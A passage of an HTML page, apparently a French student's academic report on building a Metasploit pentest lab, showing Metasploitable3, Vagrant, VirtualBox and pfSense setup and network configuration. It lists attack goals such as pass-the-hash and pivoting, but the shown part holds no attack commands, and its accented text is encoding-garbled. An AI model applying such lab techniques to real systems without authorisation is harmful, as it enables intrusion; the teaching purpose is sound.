<!DOCTYPE html>
<html lang="fr">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Virtual Lab - Pentest avec Metasploit</title>
    <link rel="stylesheet" href="data:text/javascript;base64,aW1wb3J0ICcuL3N0eWxlLmNzcycKaW1wb3J0ICcuL215c2NyaXB0LmpzJwppbXBvcnQgamF2YXNjcmlwdExvZ28gZnJvbSAnLi9qYXZhc2NyaXB0LnN2ZycKaW1wb3J0IHZpdGVMb2dvIGZyb20gJy92aXRlLnN2ZycKaW1wb3J0IHsgc2V0dXBDb3VudGVyIH0gZnJvbSAnLi9jb3VudGVyLmpzJwoKZG9jdW1lbnQucXVlcnlTZWxlY3RvcignI2FwcCcpLmlubmVySFRNTCA9IGAKICA8ZGl2PgogICAgPGEgaHJlZj0iaHR0cHM6Ly92aXRlLmRldiIgdGFyZ2V0PSJfYmxhbmsiPgogICAgICA8aW1nIHNyYz0iJHt2aXRlTG9nb30iIGNsYXNzPSJsb2dvIiBhbHQ9IlZpdGUgbG9nbyIgLz4KICAgIDwvYT4KICAgIDxhIGhyZWY9Imh0dHBzOi8vZGV2ZWxvcGVyLm1vemlsbGEub3JnL2VuLVVTL2RvY3MvV2ViL0phdmFTY3JpcHQiIHRhcmdldD0iX2JsYW5rIj4KICAgICAgPGltZyBzcmM9IiR7amF2YXNjcmlwdExvZ299IiBjbGFzcz0ibG9nbyB2YW5pbGxhIiBhbHQ9IkphdmFTY3JpcHQgbG9nbyIgLz4KICAgIDwvYT4KICAgIDxoMT5IZWxsbyBWaXRlITwvaDE+CiAgICA8ZGl2IGNsYXNzPSJjYXJkIj4KICAgICAgPGJ1dHRvbiBpZD0iY291bnRlciIgdHlwZT0iYnV0dG9uIj48L2J1dHRvbj4KICAgIDwvZGl2PgogICAgPHAgY2xhc3M9InJlYWQtdGhlLWRvY3MiPgogICAgICBDbGljayBvbiB0aGUgVml0ZSBsb2dvIHRvIGxlYXJuIG1vcmUKICAgIDwvcD4KICA8L2Rpdj4KYAoKc2V0dXBDb3VudGVyKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJyNjb3VudGVyJykpCg==" />
    <script type="module" crossorigin src="/monvirtuallab-site/assets/index-CwueEZKj.js"></script>
    <link rel="stylesheet" crossorigin href="/monvirtuallab-site/assets/index-NO_gcMUc.css">
  </head>
  <body>
    <div class="header">
      <h1>üîí Virtual Lab - Pentest avec Metasploit</h1>
      <p class="subtitle">
        Rapport acad√©mique sur la s√©curit√© offensive et les tests d'intrusion
      </p>

      <div class="badges">
        <span class="badge">üõ°Ô∏è Cybers√©curit√©</span>
        <span class="badge">üîç Pentest</span>
        <span class="badge">‚öôÔ∏è Metasploit</span>
        <span class="badge">üåê pfSense</span>
        <span class="badge">üñ•Ô∏è Virtual Lab</span>
      </div>

      <div class="meta-bar">
        <!-- Photo cliquable vers ton d√©p√¥t -->
        <a class="avatar-link"
          href="https://github.com/idom97"
          target="_blank" rel="noopener noreferrer">
          <img class="author-photo" src="/monvirtuallab-site/assets/me-DpLtazNz.webp" alt="Photo de l‚Äôauteur" width="250" height="250">
        </a>

        <div class="meta-text">
          <div class="byline">
            <span class="author-name">Dominique ERIN</span>

            <!-- Bouton style Medium (tu peux mettre profil ou d√©p√¥t) -->
            <a class="follow-btn"
              href="https://github.com/idom97"
              target="_blank" rel="noopener noreferrer">
              Follow Me!
            </a>
          </div>

          <div class="meta-sub">
            <span>5 min read</span>
            <span class="dot">‚Ä¢</span>
            <time datetime="2026-01-08">8 janv. 2026</time>
            <span class="dot">‚Ä¢</span>
          </div>
        </div>
      </div>
      <hr class="header-sep">
    </div>
    <div class="container">
      <div class="section">
        <h2>üìã √Ä propos du projet</h2>
        <div class="highlight-box">
          <p>
            J'ai r√©alis√© ce projet dans le cadre de ma seconde ann√©e de licence informatique sous la direction du
            Professeur Philippe KISLIN, Enseignant-Chercheur en Informatique √† l'IED (Institut d'Enseignement √† Distance)
            de l'Universit√© Paris 8 Vincennes.<br>
            Sur cette page, je pr√©sente les √©tapes de mise en place de mon laboratoire virtuel complet de test d'intrusion
            utilisant le Framework <strong>Metasploit</strong>. Le projet d√©montre une m√©thodologie professionnelle de pentest, de la reconnaissance
            r√©seau √† l'exploitation avanc√©e avec la cr√©ation d'une route (pivoting).
          </p>
        </div>
      </div>
      <div class="section">
        <h2>üéØ Objectifs du projet</h2>
        <div class="highlight-box">
          <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
            <li>
              Mettre en place un environnement virtuel s√©curis√© pour les tests
              d'intrusion
            </li>
            <li>
              Configurer un pare-feu pfSense avec r√®gles de filtrage
              personnalis√©es
            </li>
            <li>Exploiter des vuln√©rabilit√©s avec Metasploit Framework</li>
            <li>
              R√©aliser des attaques avanc√©es (pivoting, pass-the-hash, brute
              force)
            </li>
            <li>
              Documenter les techniques d'exploitation et recommandations de
              s√©curit√©
            </li>
          </ul>
        </div>
      </div>
      <div class="section">
        <h2>üéì Comp√©tences d√©velopp√©es</h2>
        <div class="highlight-box">
          <ul style="margin-left: 1.5rem">
            <li>
              <strong>Reconnaissance r√©seau</strong> : Nmap, arp-scan,
              √©num√©ration de services
            </li>
            <li>
              <strong>Exploitation de vuln√©rabilit√©s</strong> : Metasploit,
              attaques brute force, exploitation MySQL
            </li>
            <li>
              <strong>Post-exploitation</strong> : Meterpreter, extraction de
              hash, pass-the-hash
            </li>
            <li>
              <strong>Techniques avanc√©es</strong> : Pivoting, proxy SOCKS,
              routage r√©seau
            </li>
            <li>
              <strong>Craquage de mots de passe</strong> : John the Ripper,
              analyse de hashes
            </li>
            <li>
              <strong>Configuration pare-feu</strong> : pfSense, r√®gles de
              filtrage, segmentation r√©seau
            </li>
            <li>
              <strong>Acc√®s √† distance</strong> : RDP, FTP, contr√¥le graphique
            </li>
          </ul>
        </div>
      </div>

      <div class="section" id="menu-rapport">
        <h2>üìö Contenu D√©taill√© du Rapport</h2>
        <div class="tools-grid">
          <div class="tool-card tool-toggle">
            <div class="tool-icon">üéØ</div>
            <div class="tool-name">Metasploit 6</div>
            <a href="#metasploit-install" class="tool-desc-link">
              <div class="tool-desc">
                Pr√©sentation et installation du Framework
              </div>
            </a>
          </div>

          <div class="tool-card tool-toggle">
            <div class="tool-icon">‚öôÔ∏è</div>
            <div class="tool-name">Laboratoire virtuel</div>
            <a href="#config-reseau-detail" class="tool-desc-link">
              <div class="tool-desc">
                Configuration r√©seau des machines cibles et de la machine
                attaquante
              </div>
            </a>
          </div>

          <div class="tool-card tool-toggle">
            <div class="tool-icon">üõ°Ô∏è</div>
            <div class="tool-name">pfSense</div>
            <a href="#pfsense-detail" class="tool-desc-link">
              <div class="tool-desc">
                Organisation du r√©seau avec Pare-feu et routeur open source
              </div>
            </a>
          </div>

          <div class="tool-card large-grouping-card tool-toggle">
            <div class="tool-icon">üí£</div>
            <div class="tool-name">Phases d'attaques / Outils Pentest</div>
            <a href="#outils-pentest-resume" class="tool-desc-link">
              <div class="tool-desc">
                Outils cl√©s utilis√©s pour l'exploitation et la
                post-exploitation.
              </div>
            </a>

            <div class="grouped-tools-list">
              <a href="#arp-scan" class="grouped-tool-link">
                <div class="grouped-tool-item">
                  <div class="icon">üîç</div>
                  <div class="label">Arp-scan: D√©couverte du r√©seau</div>
                </div>
              </a>
              <a href="#nmap-scan" class="grouped-tool-link">
                <div class="grouped-tool-item">
                  <div class="icon">üîç</div>
                  <div class="label">Nmap: Scan et √©num√©ration</div>
                </div>
              </a>
              <a href="#meterpreter-payload" class="grouped-tool-link">
                <div class="grouped-tool-item">
                  <div class="icon">üåê</div>
                  <div class="label">Meterpreter: Payload avanc√©</div>
                </div>
              </a>
              <!--id="analyse-reseau-pivot"-->
              <a href="#analyse-reseau-pivot" class="grouped-tool-link">
                <div class="grouped-tool-item">
                  <div class="icon">üîç</div>
                  <div class="label">
                    Analyse r√©seau et mise en place d'un pivot
                  </div>
                </div>
              </a>
              <!---->
              <a href="#vuln√©rabilit√©s" class="grouped-tool-link">
                <div class="grouped-tool-item">
                  <div class="icon">üîç</div>
                  <div class="label">
                    Recherche de vuln√©rabilit√©s avant intrusion
                  </div>
                </div>
              </a>
              <!---->
              <a href="#intrusion" class="grouped-tool-link">
                <div class="grouped-tool-item">
                  <div class="icon">üîì</div>
                  <div class="label">
                    Tentative d'intrusion par Attaque Brute Force
                  </div>
                </div>
              </a>
              <a href="#usurpation" class="grouped-tool-link">
                <div class="grouped-tool-item">
                  <div class="icon">üîì</div>
                  <div class="label">Tentative d'intrusion par usurpation des mots de passe syst√®me</div>
                </div>
              </a>
              <!---->
              <a href="#graphique" class="grouped-tool-link">
                <div class="grouped-tool-item">
                  <div class="icon">üíª</div>
                  <div class="label">Activation du contr√¥le √† distance en mode graphique sur la machine compromise</div>
                </div>
              </a>
            </div>
          </div>

          <div class="tool-card tool-toggle">
            <div class="tool-icon">üìã</div>
            <div class="tool-name">Synth√®se</div>
            <a href="#synth" class="tool-desc-link">
              <div class="tool-desc">
                Synth√®se de l'intrusion
              </div>
            </a>
          </div>
        </div>
      </div>

      <div class="section content-section" id="metasploit-install">
        <h2>üéØ Pr√©sentation du Metasploit Framework</h2>

        <p>
          Metasploit n‚Äôest pas simplement un outil, c‚Äôest un v√©ritable framework
          d√©velopp√© √† l‚Äôorigine par H.D. Moore en 2003. Son objectif √©tait de
          faciliter le travail des professionnels de la cybers√©curit√© en
          automatisant les t√¢ches r√©p√©titives li√©es aux tests d‚Äôintrusion,
          notamment la cr√©ation, l‚Äôadaptation et l‚Äôex√©cution d‚Äôexploits. Au lieu
          de repartir de z√©ro √† chaque test, Metasploit permet de gagner un
          temps pr√©cieux en r√©utilisant des modules pr√©existants.
        </p>
        <p>
          Le framework, initialement √©crit en Perl puis r√©√©crit en Ruby, a connu
          un grand succ√®s dans la communaut√© de la cybers√©curit√©. Il a √©t√© par
          la suite acquis par la soci√©t√© Rapid7, sp√©cialis√©e dans l‚Äôanalyse de
          vuln√©rabilit√©s.
        </p>
        <p>
          Aujourd‚Äôhui, Metasploit contient plus de 2 400 modules d‚Äôexploits,
          ainsi que de nombreux modules destin√©s aux phases pr√© et
          post-exploitation. Il permet non seulement de s√©lectionner des
          attaques selon le contexte (gr√¢ce √† une vaste biblioth√®que en ligne),
          mais aussi de cr√©er des scripts personnalis√©s pour automatiser
          certaines √©tapes complexes du pentest.
        </p>
        <p>
          En r√©sum√©, Metasploit est un v√©ritable couteau suisse du test
          d‚Äôintrusion, capable d‚Äôaccompagner un pentesteur du d√©but √† la fin de
          son audit de s√©curit√©.
        </p>
        <h2>üéØ Installation de Metasploit Framework</h2>
        <p>
          D‚Äôapr√®s les consignes pr√©sentes sur le d√©p√¥t GitHub du framework 4, en
          plus d‚Äôavoir install√© un logiciel de virtualisation (nous avons retenu
          VirtualBox), il sera n√©cessaire d‚Äôinstaller les √©l√©ments suivants:
        </p>

        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
          <li>Packer 5</li>
          <li>Vagrant 6</li>
          <li>Vagrant Reload Plugin 7</li>
        </ul>
        <p>
          Une fois ces √©l√©ments install√©s, nous avons proc√©d√© comme suit pour
          mettre en place notre environnement:
        </p>

        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
          <li>Clonage du d√©p√¥t</li>
          <!---->
          Nous avons t√©l√©charg√© le contenu complet du projet Metasploitable3 en
          local √† l‚Äôaide de l‚Äôoutil git et de la commande suivante:
          <!---->
          <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">git clone https://github.com/rapid7/metasploitable3.git
            </code></pre>
          </figure>
        </div>
            
          <!--- Figure 1 ‚Äì Cl√¥nage du d√©p√¥t GitHub de Metasploit 3 -->
          <img src="/monvirtuallab-site/assets/CE2-sM_-2VjM.png" width="800" />
          <figcaption>
            Figure 1 ‚Äì Cl√¥nage du d√©p√¥t GitHub de Metasploit 3
          </figcaption>
          <!--- Figure 2 ‚Äì Cl√¥nage complet du d√©p√¥t GitHub de Metasploit 3-->
          <img src="/monvirtuallab-site/assets/CE3-BK9IERwn.png" width="800" />
          <figcaption>
            Figure 2 ‚Äì Cl√¥nage complet du d√©p√¥t GitHub de Metasploit 3
          </figcaption>
          <li>Cr√©ation de sous-dossiers par machine</li>
          <!---->
          <p>
            Dans le r√©pertoire du projet clon√©, nous avons cr√©√© un dossier d√©di√©
            √† chaque machine virtuelle √† installer. Ensuite, nous avons utilis√©
            la commande <strong>vagrant init</strong> pour initialiser la
            configuration sp√©cifique √† chaque machine, puis
            <strong>vagrant up </strong> pour t√©l√©charger l‚Äôimage
            correspondante, configurer automatiquement la machine virtuelle et
            la d√©marrer dans VirtualBox.
          </p>

          <li>Installation de Windows Server 2008 dans win2k8;</li>
          <!---->
          <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">$ PS C:\Users\iDom\metasploitable3> mkdir ubuntu1404
PS C:\Users\iDom\metasploitable3> mkdir win2k8
PS C:\Users\iDom\metasploitable3> cd win2k8
PS C:\Users\iDom\metasploitable3\win2k8> vagrant init rapid7/metasploitable3-win2k8
PS C:\Users\iDom\metasploitable3\win2k8> vagrant up
            </code></pre>
          </figure>
        </div>
          <!--- Figure 3 ‚Äì 
              Installation de la machine virtuelle Win 2008-->
          <img src="/monvirtuallab-site/assets/CE4-BQw-_BC-.png" width="700" />
          <figcaption>
            Figure 3 ‚Äì Installation de la machine virtuelle Win 2008
          </figcaption>
          <li>Installation de Ubuntu 14.04 dans ubuntu1404;</li>
          <!---->
          <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">$ PS C:\Users\iDom\metasploitable3> mkdir ubuntu1404
PS C:\Users\iDom\metasploitable3> cd ubuntu1404
PS C:\Users\iDom\metasploitable3\ubuntu1404> vagrant init rapid7/metasploitable3-ub1404
PS C:\Users\iDom\metasploitable3\ubuntu1404> vagrant up
            </code></pre>
          </figure>
        </div>
          
          <!--Installation de la machine virtuelle Ubuntu14.04-->
          <img src="/monvirtuallab-site/assets/CE7-BxZrvim7.png" width="700" />
          <figcaption>
            Figure 6 ‚Äì Installation de la machine virtuelle Ubuntu14.04
          </figcaption>
          <li>Installation de Kali Linux.</li>
          <!---->
          <p>
            Nous avons simplement t√©l√©charger son image depuis le site officiel,
            puis installer celle-ci, comme on le voit sur les captures d'√©crans
            ci-dessous.
          </p>
          <img src="/monvirtuallab-site/assets/CE11-CKuwvoPT.png" width="700" />
          <figcaption>
            Figure 7 ‚Äì T√©l√©chargement de l'image de Kali Linux
          </figcaption>
          <img src="/monvirtuallab-site/assets/CE12-CeUJ7nfF.png" width="700" />
          <figcaption>
            Figure 8 ‚Äì Installation de la machine virtuelle Kali Linux
          </figcaption>
        </ul>
        <a href="#menu-rapport" class="btn" style="background: #38b4ff">
          ‚¨ÖÔ∏è Revenir au menu du rapport
        </a>
      </div>
      <!---->
      <div class="section content-section" id="config-reseau-detail">
        <h2>‚öôÔ∏è Configuration r√©seau de l'environnement virtuel</h2>
        <!----->
        <p>
          Dans cette section, nous allons pr√©senter les diff√©rentes √©tapes qui
          nous ont permis de mettre en place un r√©seau local entre les machines
          virtuelles Ubuntu 14.04 et Windows 2008, ainsi qu‚Äôune connexion
          internet entre les machines Windows 2008 et Kali Linux.
        </p>
        <p>
          On utilisera le routeur gratuit Pfsense pour r√©aliser notre
          configuration r√©seau.
        </p>
        <h2>
          ‚öôÔ∏è Configuration du r√©seau priv√© et du r√©seau interne dans Virtualbox
        </h2>
        <!---->
        <p>
          Notre objectif est de mettre en place deux r√©seaux virtuels distincts
          dans VirtualBox afin de simuler un sc√©nario de segmentation r√©seau :
        </p>
        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
          <li>
            <strong> Un r√©seau R√©seau priv√© h√¥te</strong> (VirtualBox Host-Only
            Ethernet Adapter) pour les communications entre l‚Äôh√¥te physique et
            certaines machines virtuelles (Kali Linux, Windows Server 2008,
            pfSense).
          </li>
          <li>
            <strong> Un r√©seau R√©seau interne</strong> (intnet) permettant la
            communication isol√©e entre Windows Server 2008 et Ubuntu 14.04, via
            pfSense.
          </li>
        </ul>
        <!---->
        <p>
          Dans VirtualBox, l‚Äôoutil Network Manager (menu Fichier > Gestionnaire
          de r√©seau) permet de visualiser les r√©seaux Host-only. On constate ici
          deux r√©seaux d√©finis :
        </p>
        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
          <li>
            VirtualBox Host-Only Ethernet Adapter avec une adresse IPv4
            10.10.10.128/24 et le serveur DHCP d√©sactiv√©.
          </li>
          <li>
            VirtualBox Host-Only Ethernet Adapter #2 avec une adresse IPv4
            192.168.12.1/24 et le serveur DHCP d√©sactiv√©.
          </li>
        </ul>
        <p>
          Ce laboratoire utilisera le premier r√©seau (10.10.10.128/24) pour
          relier la machine attaquante, la machine pivot et pfSense sur son
          interface LAN.
        </p>
        <!--CE1-->
        <img src="/monvirtuallab-site/assets/CE1-DFJijJL0.png" width="500" />
        <figcaption>
          Figure 9 ‚Äì Configuration Host-only dans VirtualBox
        </figcaption>

        <!--CE2-->
        <img src="/monvirtuallab-site/assets/CE2-BOmAS-qr.png" width="500" />
        <figcaption>
          Figure 10 ‚Äì Adresse manuelle du r√©seau priv√© h√¥te
        </figcaption>
        <!---->
        <h2>‚öôÔ∏è Configuration r√©seau des machines cibles</h2>
        <h3>1. Windows Server 2008 : Le Pivot</h3>
        <p>
          La machine pivot Windows Server 2008 est pr√©sente √† la fois sur le
          r√©seau interne intnet (Adaptateur 2), d√©di√© √† la communication avec la
          machine Ubuntu 14.04, et sur le r√©seau reli√© √† Internet R√©seau priv√©
          h√¥te (Adaptateur 1 :VirtualBox Host-Only Ethernet Adapter) , utilis√©
          pour la communication avec Kali Linux et pfSense (IP dans le
          sous-r√©seau 10.10.10.0/24).
        </p>
        <!--CE-->
        <p>La configuration r√©seau de la machine virtuelle Windows Server
           2008 a √©t√© r√©alis√©e en acc√©dant au Centre R√©seau et Partage depuis le menu D√©marrer, puis en modifiant les param√®tres IPv4 de
           chaque adaptateur r√©seau.</p>
        <p>Les adresses attribu√©es sont les suivantes :
          <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
            <li>Adaptateur LAN : 10.10.10.2/24 (passerelle 10.10.10.128)</li>
            <li>Adaptateur WAN : 192.168.100.2/24</li>
            <li>LAN : 10.10.10.2</li>
            <li>WAN : 192.168.100.2</li>
          </ul>
        </p>
        <!--CE3-->
        <img src="/monvirtuallab-site/assets/CE3-CJP0-cga.png" width="800" />
        <figcaption>
          Figure 11 ‚Äì Centre R√©seau et Partage sous Windows Server 2008
        </figcaption>
        <!--CE4-->
        <img src="/monvirtuallab-site/assets/CE4-DEdzAPv_.png" width="800" />
        <figcaption>
          Figure 12 ‚Äì Propri√©t√©s de la connexion r√©seau - Adaptateur 1 (R√©seau priv√© h√¥te)
        </figcaption>
        <!--CE5-->
        <img src="/monvirtuallab-site/assets/CE5-CaBWjVRV.png" width="650" />
        <figcaption>
          Figure 13 ‚Äì Configuration IPv4 ‚Äì Adaptateur 1 (10.10.10.2/24, passerelle 10.10.10.128)
        </figcaption>
        <!--CE6-->
        <img src="/monvirtuallab-site/assets/CE6-DXTEPPDs.png" width="450" />
        <figcaption>
          Figure 14 ‚Äì Statut de la connexion ‚Äî Adaptateur 1
        </figcaption>
        <!--CE7-->
        <img src="/monvirtuallab-site/assets/CE7-CnYHX_Ak.png" width="450" />
        <figcaption>
          Figure 15 ‚Äì Propri√©t√©s de la connexion r√©seau ‚Äî Adaptateur 2 (R√©seau interne)
        </figcaption>
        <!--CE8-->
        <img src="/monvirtuallab-site/assets/CE8-CNVTQoVO.png" width="450" />
        <figcaption>
          Figure 15 ‚Äì Configuration IPv4 ‚Äî Adaptateur 2 (192.168.100.2/24)
        </figcaption>
        <!--CE9-->
        <img src="/monvirtuallab-site/assets/CE9-DhFyj5ZZ.png" width="450" />
        <figcaption>
          Figure 16 ‚Äì Adaptateur r√©seau interne sur Ubuntu 14.04
        </figcaption>
        <!--CE10-->
        <img src="/monvirtuallab-site/assets/CE10-B_qHcRbT.png" width="450" />
        <figcaption>
          Figure 16 ‚Äì Adaptateur r√©seau interne sur Ubuntu 14.04
        </figcaption>
        <h3>2. Ubuntu 14.04 : Machine cible ( r√©seau interne)</h3>
        <p>
          La machine Ubuntu 14.04 est connect√©e uniquement au r√©seau interne, 
          intnet (Adaptateur 1 : R√©seau interne), pour √©changer exclusivement 
          avec Windows Server 2008.
        </p>
        <!--CE11-->
        <img src="/monvirtuallab-site/assets/CE11-De6WLknF.png" width="800" />
        <figcaption>
          Figure 17 ‚Äì Adaptateur r√©seau interne sur Ubuntu 14.04
        </figcaption>
        <p>
          La configuration r√©seau de la machine Ubuntu 14.04 a √©t√© effectu√©e uniquement pour l‚Äôadaptateur
          r√©seau interne (intnet), destin√© √† communiquer avec Windows Server 2008 via l‚Äôadresse IP
          192.168.100.3/24.
        </p>
        <p>
          Pour r√©aliser ce param√©trage, nous avons modifi√© le fichier de configuration des interfaces r√©seau
          en ex√©cutant la commande suivante dans le terminal :
        </p>
        <!---->
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">$ sudo nano /etc/network/interfaces
            </code></pre>
          </figure>
        </div>
          
        <!--Code-->
        <p>Le contenu du fichier /etc/network/interfaces a √©t√© d√©fini comme suit:</p>
        <!---->
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash"># The loopback network interface
auto lo
iface lo inet loopback
# The primary network interface
auto eth0
iface eth0 inet static
address 192.168.100.3
netmask 255.255.255.0
            </code></pre>
          </figure>
        </div>
          
                
            
        <!--CE12-->
        <img src="/monvirtuallab-site/assets/CE12-DPOLAJro.png" width="700" />
        <figcaption>
          Figure 18 ‚Äì Connexion √† la machine Ubuntu 14.04 et ouverture du fichier /etc/network/interfaces
        </figcaption>
        <!--CE13-->
        <img src="/monvirtuallab-site/assets/CE13-Ebx7r2AF.png" width="700" />
        <figcaption>
          Figure 19 ‚Äì Configuration IPv4 statique dans /etc/network/interfaces (192.168.100.3/24)
        </figcaption>
        <h2>‚öôÔ∏è Configuration r√©seau de la machine attaquante</h2>
        <h3>1. Kali Linux: Machine attaquante</h3>
        <p>
          La machine attaquante Kali Linux est reli√©e exclusivement au R√©seau priv√© h√¥te (Adaptateur
          1: VirtualBox Host-Only Ethernet Adapter), pour communiquer avec Windows Server 2008
          et pfSense (IP dans le sous-r√©seau 10.10.10.0/24).
        </p>
        <!--CODE-->
        <!---CODE-->   
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">$ sudo ip addr add 10.10.10.100/24 dev eth0
            </code></pre>
          </figure>
        </div>
        <p>
          Le param√©trage de l‚Äôadresse IP a √©t√© effectu√© directement depuis le terminal √† l‚Äôaide de la
          commande:
        </p>
        
        <!--CE14-->
        <img src="/monvirtuallab-site/assets/CE14-CU1qcilM.png" width="800" />
        <figcaption>
          Figure 20 ‚Äì Interface r√©seau priv√©e h√¥te sur Kali Linux
        </figcaption>

        <p>
          Cette configuration permet √† Kali Linux de disposer d‚Äôune adresse fixe 10.10.10.100/24 sur
          son interface eth0, utilis√©e pour initier les attaques vers la machine pivot Windows Server 2008.
        </p>
        <a href="#menu-rapport" class="btn" style="background: #38b4ff">
          ‚¨ÖÔ∏è Revenir au menu du rapport
        </a>
      </div>
      <!---->
      <div class="section content-section" id="pfsense-detail">
        <h2>üõ°Ô∏è Organisation du r√©seau avec Pare-feu et routeur open source</h2>
        <!---->
         <!----->
        <p>
          Le pare-feu <strong>pfSense</strong> a √©t√© d√©velopp√© sous le syst√®me d'exploitation FreeBSD par Chris Buechler et Scott Ullrich. 
          Il s'agit d'une solution de s√©curit√© enti√®rement gratuite et qui d'apr√®s le <a href="https://www.pfsense.org/getting-started/">site officiel</a>, 
          a d√©montr√© sa robustesse face √† de nombreuses solutions commerciales.
        </p>
        <p>
          On utilisera donc <strongp>pfSense</strong> comme routeur pour r√©aliser notre configuration r√©seau.
        </p>
        <!---->
        <h2>‚öôÔ∏è Installation et configuration de pfSense</h2>
        Nous utilisons <strong>pfSense</strong> en mode ligne de commande, l‚Äôinterface graphique 
        √©tant difficilement exploitable depuis <strong>Windows Server 2008 R2 Standard</strong>.
        <!---->
        <!---->
        <h3>1. T√©l√©chargement et installation</h3>
        <p>Nous commen√ßons par t√©l√©charger l'ISO d'installation depuis le <a href="https://www.pfsense.org/getting-started/">site officiel</a></p>
        <!--CE1-->
        <img src="/monvirtuallab-site/assets/CE1-EduORwR9.png" width="500" />
        <figcaption>
          Figure 21 ‚Äì T√©l√©chargement de pfSense depuis le site officiel
        </figcaption>
        <p>Apr√®s extraction des fichiers t√©l√©charg√©s, nous cr√©ons une nouvelle machine virtuelle dans VirtualBox.
          Nous s√©lectionnons le type BSD, sous-type FreeBSD (64-bit), et attachons l‚Äôimage ISO comme disque
          d‚Äôamor√ßage.
        </p>
        <!--CE2-->
        <img src="/monvirtuallab-site/assets/CE2-BYLG8gVX.png" width="500" />
        <figcaption>
          Figure 22 ‚Äì Cr√©ation de la machine virtuelle pfSense dans VirtualBox
        </figcaption>
        <!---->
         <p>Lors du premier d√©marrage, l‚Äôinstallateur Netgate se lance. 
          Nous acceptons les conditions de licence.
        </p>
        <!--CE3-->
        <img src="/monvirtuallab-site/assets/CE3-DWjN489g.png" width="500" />
        <figcaption>
          Figure 23 ‚Äì Chargement de l‚Äôimage ISO et lancement de l‚Äôinstallation
        </figcaption>
        <!---->
        <p>Une fois l‚Äôinstallation termin√©e, nous retirons l‚ÄôISO et red√©marrons la machine virtuelle. 
          pfSense affiche alors son menu principal en console.
        </p>
        <!--CE4-->
        <img src="/monvirtuallab-site/assets/CE4-xOFLB00e.png" width="500" />
        <figcaption>
          Figure 24 ‚Äì Menu principal de configuration console pfSense
        </figcaption>
        <!---->
        <!---->
        <h3>2. Param√©trage de l‚Äôinterface WAN</h3>
        <!---->
        <p>Nous acc√©dons au menu console et choisissons l‚Äôoption 2: <strong>Set interface(s) IP address</strong>, puis
        s√©lectionnons <strong>WAN (em0)</strong>. Nous d√©sactivons le DHCP (n) et configurons l‚Äôadresse IPv4 statique
        192.168.148.128/24 avec comme passerelle 192.168.148.2, d√©finie comme passerelle par d√©faut (y).

        </p>
        <!--CE5-->
        <img src="/monvirtuallab-site/assets/CE5-CkLEgZje.png" width="700" />
        <figcaption>
          Figure 25 ‚Äì  Configuration IPv4 statique sur l‚Äôinterface WAN
        </figcaption>
        <!---->
        <p>Apr√®s validation, pfSense applique la configuration et confirme que l‚Äôadresse IPv4 du WAN est bien
            d√©finie sur 192.168.148.128/24
        </p>
        <!--CE6-->
        <img src="/monvirtuallab-site/assets/CE6-E89c0zde.png" width="700" />
        <figcaption>
          Figure 26 ‚Äì Confirmation de l‚Äôadresse IPv4 sur l‚Äôinterface WAN
        </figcaption>
        <!---->
        <!---->
        <h3>3. Param√©trage de l‚Äôinterface LAN</h3>
        <p>Nous proc√©dons ensuite √† la configuration de l‚Äôinterface <strong>LAN (em1)</strong> depuis le m√™me menu console.
          Nous choisissons de ne pas utiliser le DHCP (n) pour l‚Äôadresse IPv4 et attribuons l‚Äôadresse statique
          10.10.10.128/24. La passerelle IPv4 reste 10.10.10.128 et nous la d√©finissons comme passerelle par
          d√©faut (y).
        </p>
        <!--CE5-->
        <img src="/monvirtuallab-site/assets/CE7-CZi-qvGV.png" width="700" />
        <figcaption>
          Figure 27 ‚Äì S√©lection de l‚Äôinterface LAN dans pfSense
        </figcaption>
        <!---->
        <p>Nous d√©sactivons IPv6 (n) puis activons le serveur DHCP sur le LAN (y) avec une plage d‚Äôadresses
           allant de 10.10.10.100 √† 10.10.10.200. Apr√®s validation, pfSense applique la configuration et confirme que l‚Äôadresse IPv4 du LAN est bien
           d√©finie sur 10.10.10.128/24.
        </p>
        <!--CE6-->
        <img src="/monvirtuallab-site/assets/CE8-LNC8wRn8.png" width="700" />
        <figcaption>
          Figure 28 ‚Äì Configuration IPv4 statique et DHCP sur le LAN et Confirmation de l‚Äôadresse IPv4 sur l‚Äôinterface LAN
        </figcaption>
        <!---->

        <!---->
        <h2>‚öôÔ∏è D√©finition des r√®gles personnalis√©es en ligne de commande</h2>
        <p>Les r√®gles que nous avons mises en place pour le routeur pfSense sont inspir√©es 
          de celles propos√©es par Dustin Noe dans son article sur <a href="https://medium.com/@noe.dustin/advanced-pentesting-lab-with-vmware-vyos-kali-and-metasploitable3-3d0c07419e49">VyOS 11</a>.</p>
          
        <p>Lors du param√©trage des interfaces r√©seau de <strong>pfSense</strong>, nous avons d√©fini:
          <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
            <li>L‚Äôinterface WAN avec l‚Äôadresse IP 192.168.148.2/24</li>
            <li>L‚Äôinterface LAN avec l‚Äôadresse IP 10.10.10.128/24</li>
          </ul>
          Les machines <strong>Windows Server 2008</strong> et <strong>Ubuntu 14.04</strong> sont toutes deux connect√©es derri√®re le
